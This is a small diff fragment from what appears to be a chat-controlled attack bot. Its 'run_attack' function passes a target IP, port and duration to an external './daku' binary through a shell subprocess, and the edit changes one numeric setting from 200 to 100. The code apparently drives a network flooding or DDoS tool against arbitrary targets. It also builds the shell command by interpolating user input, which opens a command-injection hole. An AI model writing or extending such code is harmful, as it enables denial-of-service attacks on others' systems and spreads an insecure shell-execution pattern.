@@ -165,7 +165,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./daku {ip} {port} {duration} {200} {1000}"
+        command = f"./daku {ip} {port} {duration} {100} {1000}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
